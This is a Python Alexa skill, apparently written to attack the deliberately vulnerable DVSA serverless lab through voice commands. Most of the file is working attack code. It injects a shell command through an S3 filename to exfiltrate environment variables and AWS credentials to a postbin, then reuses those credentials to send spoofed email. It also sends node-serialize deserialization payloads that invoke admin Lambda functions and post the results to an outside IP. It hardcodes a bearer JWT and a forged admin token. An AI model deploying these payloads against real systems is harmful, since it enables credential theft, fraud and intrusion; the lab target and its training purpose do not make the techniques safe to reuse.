# This is the main pyhton skill that interacts with the amazon in order to run the skill
import logging
import random
import string
from datetime import datetime
import base64
import json
import time
import uuid

import requests
import botocore
import boto3

from ask_sdk_core.skill_builder import SkillBuilder
from ask_sdk_core.utils import is_request_type, is_intent_name
from ask_sdk_core.handler_input import HandlerInput

from ask_sdk_model.ui import SimpleCard
from ask_sdk_model import Response

ENDPOINT = 'https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com'
JWT = 'eyJraWQiOiJHYjNJQzQ3U2FjRTBCelNSTEM1c1JVWXF0eW9USGdwWkRrdFwvYzdXVW4wcz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI0NDEwYThkNC1mM2E5LTQzYzQtOWM2MC0wNjFiMTY3NjdhNjEiLCJldmVudF9pZCI6ImE1YzlmZmI5LTUwN2UtNDIyYS05ZmI1LTZkNjkwYTZjMmRiZCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE1ODkwNDIxNjEsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX01ZYTZuSUFqRiIsImV4cCI6MTU4OTA0NTc2MSwiaWF0IjoxNTg5MDQyMTYxLCJqdGkiOiIxOTIyM2M0NC04NTk5LTQzODUtOTBlYS1hODI4Nzc0MTRkZjciLCJjbGllbnRfaWQiOiIzYWJoOW4yOTV0aTBycWlrM2k1M2o0aW1vcSIsInVzZXJuYW1lIjoiNDQxMGE4ZDQtZjNhOS00M2M0LTljNjAtMDYxYjE2NzY3YTYxIn0.bsZkO61difhWShVRXzV1jebxHu9BZggp9zknN7e-RLJv72jo1nxaRzVOCAxRh16vx7axLXkafkxAKOkS567Nnh0YKPS8r8AoAR8NIFDYKajgrmeK3W2gxxExXDDC_FIc6QaNUZX2B1BzQ0MAkSLyZqHYLg6oHPtN7LSNC4LY6NKYrK0WiWDu0YYTerZxn334-fTxPvPr3l_wH-_Zd2eKXovlRhwpSl_MAK9gR-X2KvZEC4-aONHYtKhTGTPHdbQn4gDiYUNTRtTIx7Jf3ibHDg_sP7d4NenTkEtc12ZXhVuZzuJe19CSWStQCGM8i4pItkaI6EcFHOZO-qcMAVKMRA'

BUCKET = 'dvsa-receipts-bucket-891121914068'
EMAIL_SRC = 'dvsa.noreply@mailsac.com'
EMAIL_DEST = 'emm@heff.ie'

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

sb = SkillBuilder()

class POSTBin:
    def __enter__(self):
        r = requests.post('https://postb.in/api/bin')
        r.raise_for_status()
        self.bin_id = r.json()['binId']
        return self

    def __exit__(self, t, v, tb):
        r = requests.delete(f'https://postb.in/api/bin/{self.bin_id}')
        r.raise_for_status()

    @property
    def bin_url(self):
        return f'https://postb.in/{self.bin_id}'

    def pop_req(self):
        r = requests.get(f'https://postb.in/api/bin/{self.bin_id}/req/shift')
        r.raise_for_status()
        return r.json()


@sb.request_handler(can_handle_func=is_request_type("LaunchRequest"))
def launch_request_handler(handler_input):
    """Handler for Skill Launch."""
    # type: (HandlerInput) -> Response
    speech_text = "Welcome to the hacker skill, to list available attacks say 'list attacks'"

    return handler_input.response_builder.speak(speech_text).set_card(
        SimpleCard("Hello World", speech_text)).set_should_end_session(
        False).response

@sb.request_handler(can_handle_func=is_intent_name("AMAZON.HelpIntent"))
def help_intent_handler(handler_input):
    """Handler for Help Intent."""
    # type: (HandlerInput) -> Response
    speech_text = "Available attacks are: \n View latest order. \n Send a spoofed email. \n Place a fake order. \n Delete an order. \n To start the attack just say the phrase of the attack you want to use"

    return handler_input.response_builder.speak(speech_text).ask(
        speech_text).set_card(SimpleCard(
            "Hello World", speech_text)).response

@sb.request_handler(
    can_handle_func=lambda handler_input:
        is_intent_name("AMAZON.CancelIntent")(handler_input) or
        is_intent_name("AMAZON.StopIntent")(handler_input))
def cancel_and_stop_intent_handler(handler_input):
    """Single handler for Cancel and Stop Intent."""
    # type: (HandlerInput) -> Response
    speech_text = "Goodbye!"

    return handler_input.response_builder.speak(speech_text).set_card(
        SimpleCard("Hello World", speech_text)).response

@sb.request_handler(can_handle_func=is_intent_name("AMAZON.FallbackIntent"))
def fallback_handler(handler_input):
    """AMAZON.FallbackIntent is only available in en-US locale.
    This handler will not be triggered except in that locale,
    so it is safe to deploy on any locale.
    """
    # type: (HandlerInput) -> Response
    speech = (
        "The  skill can't help you with that.  "
        "You can say 'demo injection attack'!!")
    reprompt = "You can say 'demo injection attack'!!"
    handler_input.response_builder.speak(speech).ask(reprompt)
    return handler_input.response_builder.response

@sb.request_handler(can_handle_func=is_request_type("SessionEndedRequest"))
def session_ended_request_handler(handler_input):
    """Handler for Session End."""
    # type: (HandlerInput) -> Response
    return handler_input.response_builder.response

@sb.exception_handler(can_handle_func=lambda i, e: True)
def all_exception_handler(handler_input, exception):
    """Catch all exception handler, log exception and
    respond with custom message.
    """
    # type: (HandlerInput, Exception) -> Response
    logger.error(exception, exc_info=True)

    speech = "Sorry, there was some problem. Please try again!!"
    handler_input.response_builder.speak(speech).ask(speech)

    return handler_input.response_builder.response

@sb.request_handler(can_handle_func=is_intent_name('EmailSpoofIntent'))
def email_spoof_handler(handler_input):
    # anonymous access to s3 - the bucket is open
    s3 = boto3.client('s3', config=botocore.client.Config(signature_version=botocore.UNSIGNED))
    with POSTBin() as pb:
        # send base64-encoded environment variables to postbin
        enc_url = pb.bin_url.replace('/', '\\x2f')
        filename = f'2020/02/20/null_;e=`env|base64 -w 0`;printf "{enc_url}?env=$e" | xargs curl -X POST;echo x.raw'
        s3.put_object(Bucket=BUCKET, Key=filename, Body=b'', ACL='public-read')

        # it might take a while for the request to go through
        start = time.time()
        while True:
            try:
                req = pb.pop_req()
                break
            except requests.HTTPError:
                if time.time() - start > 10:
                    raise
                time.sleep(0.5)

        # parse environment variables into a dict
        env = {}
        for l in base64.b64decode(req['query']['env']).decode('utf-8').strip().split('\n'):
            pair = l.split('=')
            env[pair[0]] = pair[1]

    # create a new session with leaked creds
    session = boto3.Session(
        region_name='us-east-1',
        aws_access_key_id=env['AWS_ACCESS_KEY_ID'],
        aws_secret_access_key=env['AWS_SECRET_ACCESS_KEY'],
        aws_session_token=env['AWS_SESSION_TOKEN']
    )

    # use leaked creds to clean up our injection value
    s3 = session.client('s3')
    s3.delete_object(Bucket=BUCKET, Key=filename[:-4] + '.txt')

    # send our spoofed email
    ses = session.client('ses')
    ses.send_email(
        Source=EMAIL_SRC,
        Destination={
            'ToAddresses': [EMAIL_DEST],
        },
        Message={
            'Subject': {
                'Charset': 'UTF-8',
                'Data': handler_input.request_envelope.request.intent.slots['subject'].value
            },
            'Body': {
                'Text': {
                    'Charset': 'UTF-8',
                    'Data': handler_input.request_envelope.request.intent.slots['body'].value
                }
            }
        }
    )

    speech_text = f'Sending an email to {EMAIL_DEST}...'
    return handler_input.response_builder.speak(speech_text).set_card(
        SimpleCard('Spoofed Email', speech_text)).set_should_end_session(True).response


@sb.request_handler(can_handle_func=is_intent_name('FakeOrder'))
def sendFakeOrder(handler_input):

    headers = {
        'Authorization': JWT
    }
    payloadCookie = ".ewogICJzdWIiOiAiNzhmZDM0ZGMtMWIzYS00YWFjLTk3MTEtNmFmZGZjZjAxMmNkIiwKICAiZXZlbnRfaWQiOiAiYWExNjU4MDktNDFmYy00ZjZkLWI4MDAtYWUyNjkxODYyYTVmIiwKICAidG9rZW5fdXNlIjogImFjY2VzcyIsCiAgInNjb3BlIjogImF3cy5jb2duaXRvLnNpZ25pbi51c2VyLmFkbWluIiwKICAiYXV0aF90aW1lIjogMTU4ODk1NDcyMCwKICAiaXNzIjogImh0dHBzOi8vY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vdXMtZWFzdC0xX01ZYTZuSUFqRiIsCiAgImV4cCI6IDE1ODkzMjYyODgsCiAgImlhdCI6IDE1ODkzMjI2ODgsCiAgImp0aSI6ICIyYjJlNTJmOC03ZjMyLTQ5ZTAtODNjMi0yYzRiOTU2OTFmZDciLAogICJjbGllbnRfaWQiOiAiM2FiaDluMjk1dGkwcnFpazNpNTNqNGltb3EiLAogICJ1c2VybmFtZSI6ICI3OGZkMzRkYy0xYjNhLTRhYWMtOTcxMS02YWZkZmNmMDEyY2QiCn0=."
    ts = str(int(time.time()))
    cartID = str(uuid.uuid4())

    def tokenGen(size=12, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
        return ''.join(random.choice(chars) for _ in range(size))

    randToken = tokenGen()

    # Make a new order with a cart ID:
    response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json=
    {
        "action":"new",
        "cart-id":""+cartID+"",
        "items":{"19":1}

    })

    name = handler_input.request_envelope.request.intent.slots['Name'].value
    address = handler_input.request_envelope.request.intent.slots['Address'].value

    x = response.content
    orderID = str(x.decode("utf-8")[49:-2])
    response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json=
    {
        "action":"shipping",
        f"order-id":"{orderID}",
        "data":{
            f"name":"{name}",
            f"address":"{address}",
            "email":"admin@nsa.gov",
            "phone":"+133333333337"
            }
    })
    response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json=
    {
        "action":"billing",
        f"order-id":"{orderID}",
        "data":{
            "ccn":"4242424242424242",
            "exp":"02/20",
            "cvv":"123"
            }
    })
    # final part: the status code is set to 110 this means payment failed. we can use the admin update function in order to update this status code to something else. either 200 for processing or 120 for paid
    payload = (
        '_$$ND_FUNC$$_function(){'
            'var p=JSON.stringify({'
                '"headers":{"authorization":'
                f'"{payloadCookie}"'
                '},"body":{'
                '"action":"update",' 
                f'"order-id": "{orderID}",'
                '"item":{'
                f'"token": "{randToken}", "ts": "{ts}",' 
                '"itemList": {"11": 1},' 
                f'"address": "{address}",' 
                '"total": 25,' 
                '"status": 200}'
                '}'
            '});'
            'var a=require("aws-sdk");'
            'var l=new a.Lambda();'
            'var x={FunctionName:"DVSA-ADMIN-UPDATE-ORDERS",'
            'InvocationType:"RequestResponse",'
            'Payload:p};'
            'l.invoke(x, function(e,d){'
            'var h=require("http");'
            'h.get("http://92.222.72.208"+JSON.stringify(d));'
            '});'
        '}()'
    )
    r =requests.post(f"{ENDPOINT}/dev/order", headers={
        'Accept': 'application/json',
        'Authorization': JWT
    }, json={'action': payload})

    
    
    
    speech_text = f'Fake Order for {name} has been placed'
    return handler_input.response_builder.speak(speech_text).set_card(
        SimpleCard('Fake Order', speech_text)).set_should_end_session(True).response

@sb.request_handler(can_handle_func=is_intent_name('DeleteOrder'))
def deleteOrder(handler_input):
    def validUUID(val):
        try:
            uuid.UUID(str(val))
            return True
        except ValueError:
            return False
    
    OrderID = handler_input.request_envelope.request.intent.slots['orderID'].value
    if validUUID(OrderID) == True:
        payloadCookie = ".ewogICJzdWIiOiAiNzhmZDM0ZGMtMWIzYS00YWFjLTk3MTEtNmFmZGZjZjAxMmNkIiwKICAiZXZlbnRfaWQiOiAiYWExNjU4MDktNDFmYy00ZjZkLWI4MDAtYWUyNjkxODYyYTVmIiwKICAidG9rZW5fdXNlIjogImFjY2VzcyIsCiAgInNjb3BlIjogImF3cy5jb2duaXRvLnNpZ25pbi51c2VyLmFkbWluIiwKICAiYXV0aF90aW1lIjogMTU4ODk1NDcyMCwKICAiaXNzIjogImh0dHBzOi8vY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vdXMtZWFzdC0xX01ZYTZuSUFqRiIsCiAgImV4cCI6IDE1ODkzMjYyODgsCiAgImlhdCI6IDE1ODkzMjI2ODgsCiAgImp0aSI6ICIyYjJlNTJmOC03ZjMyLTQ5ZTAtODNjMi0yYzRiOTU2OTFmZDciLAogICJjbGllbnRfaWQiOiAiM2FiaDluMjk1dGkwcnFpazNpNTNqNGltb3EiLAogICJ1c2VybmFtZSI6ICI3OGZkMzRkYy0xYjNhLTRhYWMtOTcxMS02YWZkZmNmMDEyY2QiCn0=."
        payload = (
            '_$$ND_FUNC$$_function(){'
                'var p=JSON.stringify({'
                     '"headers":{"authorization":'
                     f'"{payloadCookie}"'
                     '},"body":{'
                     '"action":"update",' 
                     f'"order-id": "{OrderID}",'
                     '"item":{"token": "NA", "ts": "1589660822",' 
                     '"itemList": {"11": 1},' 
                     '"address": "NA",' 
                     '"total": 25,' 
                     '"status": 100}'
                    '}'
                '});'
                'var a=require("aws-sdk");'
                'var l=new a.Lambda();'
                'var x={FunctionName:"DVSA-ADMIN-UPDATE-ORDERS",'
                'InvocationType:"RequestResponse",'
                'Payload:p};'
                'l.invoke(x, function(e,d){'
                'var h=require("http");'
                'h.get("http://92.222.72.208"+JSON.stringify(d));'
                '});'
            '}()'
        )
        requests.post(f"{ENDPOINT}/dev/order", headers={
            'Accept': 'application/json',
            'Authorization': JWT
        }, json={'action': payload})
        
        speech_text = 'That order has been deleted!'
        return handler_input.response_builder.speak(speech_text).set_card(
            SimpleCard('delete order', speech_text)).set_should_end_session(False).response
    else:
        speech_text = 'You have to use a real order ID, Please start the skill again'
        return handler_input.response_builder.speak(speech_text).set_card(
            SimpleCard('delete order', speech_text)).set_should_end_session(True).response


@sb.request_handler(can_handle_func=is_intent_name('EventInjection'))
def event_injection_handler(handler_input):
    with POSTBin() as pb:
        payload = (
            '_$$ND_FUNC$$_function() {'
                'var aws = require("aws-sdk");'
                'var lambda = new aws.Lambda();'
                'var p = {'
                    'FunctionName: "DVSA-ADMIN-GET-ORDERS",'
                    'InvocationType: "RequestResponse",'
                '};'
                'lambda.invoke(p, function(e, d) {'
                    'var h = require("https");'
                    f'var r = h.request("{pb.bin_url}", {{'
                        'method: "POST",'
                        'headers: {"Content-Type": "application/json"}'
                    '});'
                    'r.write(d.Payload);'
                    'r.end();'
                '});'
            '}()'
        )
        requests.post(f"{ENDPOINT}/dev/order", headers={
            'Accept': 'application/json',
            'Authorization': JWT
        }, json={'action': payload})

        body = pb.pop_req()['body']
        for o in sorted(body['orders'], key=lambda o: o['paymentTS'], reverse=True):
            # only wanted delivered orders that have a full address
            if o['orderStatus'] != 300 or isinstance(o['address'], str):
                continue

            order = o
            break
        print(order)

        speech_text = (
            'The most recent order was paid on <say-as interpret-as="date">'
            f'{datetime.fromtimestamp(order["paymentTS"]).strftime("%Y%m%d")}</say-as> by'
            f'"{order["address"]["name"]}". The total was ${order["totalAmount"]} and it was delivered to '
            f'<say-as interpret-as="address">{order["address"]["address"]}</say-as>.'
        )

    return handler_input.response_builder.speak(speech_text).set_card(
        SimpleCard("Event Injection", speech_text)).set_should_end_session(True).response

# Handler name that is used on AWS lambda
lambda_handler = sb.lambda_handler()
